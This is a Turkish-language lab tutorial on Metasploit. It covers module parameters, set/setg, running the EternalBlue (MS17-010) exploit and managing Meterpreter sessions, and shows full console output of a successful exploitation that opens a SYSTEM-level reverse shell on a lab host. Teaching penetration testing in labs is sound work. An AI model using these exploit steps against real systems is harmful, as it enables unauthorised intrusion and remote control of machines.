# Hedef Makine Üzerinde Metasploit Kullanımı

Aşağıda gösterilen örnekleri tekrarlamak için bu odaya eklenmiş olan hedef makineyi başlatabilirsiniz. Herhangi bir Metasploit versiyon 5 veya 6, burada gösterilenlere benzer menülere ve ekranlara sahip olacaktır; bu nedenle AttackBox'ı veya yerel bilgisayarınızda yüklü olan herhangi bir işletim sistemini kullanabilirsiniz.

Daha önce görüldüğü gibi, `use` komutunu ve ardından modül adını kullanarak bir modülün bağlamına (context) girdikten sonra, parametreleri ayarlamanız gerekecektir. En yaygın kullanacağınız parametreler aşağıda listelenmiştir. Unuttuğunuzda, kullandığınız modüle bağlı olarak ek veya farklı parametrelerin ayarlanması gerekebileceğini unutmayın. Gerekli parametreleri listelemek için `show options` komutunu kullanmak iyi bir uygulamadır.

Tüm parametreler aynı komut sözdizimi kullanılarak ayarlanır: `set PARAMETRE_ADI DEĞER`

Devam etmeden önce, doğru bağlamda olduğunuzdan emin olmak için her zaman msfconsole istemini kontrol etmeyi unutmayın. Metasploit ile uğraşırken beş farklı istem görebilirsiniz:

1. **Normal komut istemi:** Burada Metasploit komutlarını kullanamazsınız. **Normal komut istemi** `root@ip-10-10-XX-XX:~#`
    
2. **msfconsole istemi:** msf6 (veya yüklü sürümünüze bağlı olarak msf5) msfconsole istemidir. Görebileceğiniz gibi, burada hiçbir bağlam ayarlanmamıştır, bu nedenle parametreleri ayarlamak ve modülleri çalıştırmak için bağlama özgü komutlar burada kullanılamaz. **Metasploit komut istemi** `msf6 >`
    
3. **Bir bağlam (context) istemi:** Bir modülü kullanmaya karar verip onu seçmek için set komutunu kullandığınızda, msfconsole bağlamı gösterecektir. Burada bağlama özgü komutları (örneğin `set RHOSTS 10.10.x.x`) kullanabilirsiniz. **Bir bağlam komut istemi** `msf6 exploit(windows/smb/ms17_010_eternalblue) >`
    
4. **Meterpreter istemi:** Meterpreter, bu modülde daha sonra detaylı olarak göreceğimiz önemli bir payload'dur. Bu, hedef sisteme bir Meterpreter ajanının yüklendiği ve size geri bağlandığı anlamına gelir. Burada Meterpreter'a özgü komutları kullanabilirsiniz. **Bir Meterpreter komut istemi** `meterpreter >`
    
5. **Hedef sistemde bir shell:** Exploit tamamlandığında, hedef sistemdeki bir komut satırına (shell) erişiminiz olabilir. Bu normal bir komut satırıdır ve burada yazılan tüm komutlar hedef sistemde çalışır. **Bir Meterpreter komut istemi** `C:\Windows\system32>`
    

Daha önce bahsedildiği gibi, `show options` komutu mevcut tüm parametreleri listeleyecektir.

**Show options komutu**

Bash

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.44.70      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Yukarıdaki ekran görüntüsünde görebileceğiniz gibi, bu parametrelerden bazılarının exploit'in çalışması için bir değere ihtiyacı vardır. Bazı gerekli parametre değerleri önceden doldurulmuş olacaktır, bunların hedefiniz için aynı kalıp kalmaması gerektiğini kontrol ettiğinizden emin olun. Örneğin, bir web exploit'inin RPORT (uzak port: Metasploit'in bağlanmaya ve exploit'i çalıştırmaya çalışacağı hedef sistemdeki port) değeri önceden 80 olarak ayarlanmış olabilir, ancak hedef web uygulamanız 8080 portunu kullanıyor olabilir.

Bu örnekte, `set` komutunu kullanarak RHOSTS parametresini hedef sistemimizin IP adresine ayarlayacağız.

**Bir Meterpreter komut istemi**

Bash

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.165.39
rhosts => 10.10.165.39
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.165.39     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.44.70      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Bir parametreyi ayarladıktan sonra, değerin doğru ayarlandığını kontrol etmek için `show options` komutunu kullanabilirsiniz.

Sıklıkla kullanacağınız parametreler şunlardır:

- **RHOSTS:** “Remote host”, hedef sistemin IP adresi. Tek bir IP adresi veya bir ağ aralığı ayarlanabilir. Bu, CIDR (Classless Inter-Domain Routing) notasyonunu (/24, /16, vb.) veya bir ağ aralığını (10.10.10.x – 10.10.10.y) destekleyecektir. Aşağıda görebileceğiniz gibi, hedeflerin listelendiği bir dosyayı da `file:/hedef_dosyasinin/yolu.txt` kullanarak her satıra bir hedef gelecek şekilde kullanabilirsiniz.
    
- **RPORT:** “Remote port”, hedef sistemde savunmasız uygulamanın çalıştığı port.
    
- **PAYLOAD:** Exploit ile birlikte kullanacağınız yük.
    
- **LHOST:** “Localhost”, saldıran makinenin (AttackBox'ınız veya Kali Linux) IP adresi.
    
- **LPORT:** “Local port”, reverse shell'in geri bağlanması için kullanacağınız port. Bu, saldıran makinenizdeki bir porttur ve başka herhangi bir uygulama tarafından kullanılmayan herhangi bir porta ayarlayabilirsiniz.
    
- **SESSION:** Metasploit kullanılarak hedef sisteme kurulan her bağlantının bir oturum kimliği (session ID) olacaktır. Bunu, mevcut bir bağlantıyı kullanarak hedef sisteme bağlanacak olan sızma sonrası (post-exploitation) modülleriyle kullanacaksınız.
    

Herhangi bir ayarlanmış parametreyi, farklı bir değerle `set` komutunu tekrar kullanarak geçersiz kılabilirsiniz. Ayrıca `unset` komutunu kullanarak herhangi bir parametre değerini temizleyebilir veya `unset all` komutuyla tüm ayarlanmış parametreleri temizleyebilirsiniz.

**Unset all komutu**

Bash

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > unset all
Flushing datastore...
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) [Optional] The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Tüm modüller için kullanılacak değerleri ayarlamak için `setg` komutunu kullanabilirsiniz. `setg` komutu `set` komutu gibi kullanılır. Aradaki fark, bir modül kullanarak bir değer ayarlamak için `set` komutunu kullanırsanız ve başka bir modüle geçerseniz, değeri tekrar ayarlamanız gerekecektir. `setg` komutu, değerin farklı modüller arasında varsayılan olarak kullanılabilmesi için değeri ayarlamanıza olanak tanır. `setg` ile ayarlanan herhangi bir değeri `unsetg` kullanarak temizleyebilirsiniz.

Aşağıdaki örnek şu akışı kullanır;

1. `ms17_010_eternalblue` sömürülebilir modülünü kullanırız.
    
2. `set` komutu yerine `setg` komutunu kullanarak RHOSTS değişkenini ayarlarız.
    
3. Exploit bağlamından ayrılmak için `back` komutunu kullanırız.
    
4. Bir yardımcı modül kullanırız (bu modül MS17-010 zafiyetlerini keşfetmek için bir tarayıcıdır).
    
5. `show options` komutu, RHOSTS parametresinin hedef sistemin IP adresiyle zaten doldurulmuş olduğunu gösterir.
    

**Modüller arası geçiş**

Bash

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue 
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > setg rhosts 10.10.165.39
rhosts => 10.10.165.39
msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 > use auxiliary/scanner/smb/smb_ms17_010 
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                                                Required  Description
   ----         ---------------                                                --------  -----------
   CHECK_ARCH   true                                                           no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                                           no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                                          no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /opt/metasploit-framework-5101/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS       10.10.165.39                                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   RPORT        445                                                            yes       The SMB service port (TCP)
   SMBDomain    .                                                              no        The Windows domain to use for authentication
   SMBPass                                                                     no        The password for the specified username
   SMBUser                                                                     no        The username to authenticate as
   THREADS      1                                                              yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/smb/smb_ms17_010) >
```

`setg` komutu, Metasploit'ten çıkana veya `unsetg` komutunu kullanarak temizleyene kadar kullanılacak olan global bir değer ayarlar.

### Modülleri Kullanma

Tüm modül parametreleri ayarlandıktan sonra, modülü `exploit` komutunu kullanarak başlatabilirsiniz. Metasploit ayrıca, exploit olmayan modülleri (port tarayıcılar, zafiyet tarayıcılar vb.) kullanırken "exploit" kelimesi mantıklı gelmediği için `exploit` komutu için oluşturulmuş bir takma ad olan `run` komutunu da destekler.

`exploit` komutu parametresiz veya “-z” parametresi kullanılarak kullanılabilir. `exploit -z` komutu, exploit'i çalıştıracak ve oturum açılır açılmaz arka plana atacaktır.

**exploit -z komutu**

Bash

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -z

[*] Started reverse TCP handler on 10.10.44.70:4444 
[*] 10.10.12.229:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.12.229:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.12.229:445      - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.12.229:445 - Connecting to target for exploitation.
[+] 10.10.12.229:445 - Connection established for exploitation.
[+] 10.10.12.229:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.12.229:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.12.229:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.12.229:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.12.229:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.12.229:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.12.229:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.12.229:445 - Sending all but last fragment of exploit packet
[*] 10.10.12.229:445 - Starting non-paged pool grooming
[+] 10.10.12.229:445 - Sending SMBv2 buffers
[+] 10.10.12.229:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.12.229:445 - Sending final SMBv2 buffers.
[*] 10.10.12.229:445 - Sending last fragment of exploit packet!
[*] 10.10.12.229:445 - Receiving response from exploit packet
[+] 10.10.12.229:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.12.229:445 - Sending egg to corrupted connection.
[*] 10.10.12.229:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 10.10.12.229
[*] Meterpreter session 2 opened (10.10.44.70:4444 -> 10.10.12.229:49186) at 2021-08-20 02:06:48 +0100
[+] 10.10.12.229:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.12.229:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.12.229:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Session 2 created in the background.
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Bu, sizi exploit'i çalıştırdığınız bağlam istemine geri döndürecektir. Bazı modüller `check` seçeneğini destekler. Bu, hedef sistemi sömürmeden (exploiting) savunmasız olup olmadığını kontrol edecektir.

### Oturumlar (Sessions)

Bir zafiyet başarıyla istismar edildiğinde bir oturum (session) oluşturulacaktır. Bu, hedef sistem ile Metasploit arasında kurulan iletişim kanalıdır.

Oturum istemini arka plana atmak ve msfconsole istemine geri dönmek için `background` komutunu kullanabilirsiniz.

**Oturumları arka plana atma**

Bash

```
meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```

Alternatif olarak, oturumları arka plana atmak için **CTRL+Z** kullanılabilir. Mevcut oturumları görmek için msfconsole isteminden veya herhangi bir bağlamdan `sessions` komutu kullanılabilir.

**Aktif oturumları listeleme**

Bash

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49163 (10.10.12.229)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49186 (10.10.12.229)

msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 > sessions 

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49163 (10.10.12.229)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49186 (10.10.12.229)

msf6 >
```

Herhangi bir oturumla etkileşime girmek için, `sessions -i` komutunu ve ardından istediğiniz oturum numarasını kullanabilirsiniz.

**Oturumlarla etkileşim kurma**

Bash

```
msf6 > sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49163 (10.10.12.229)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49186 (10.10.12.229)

msf6 > sessions -i 2
[*] Starting interaction with 2...

meterpreter >
```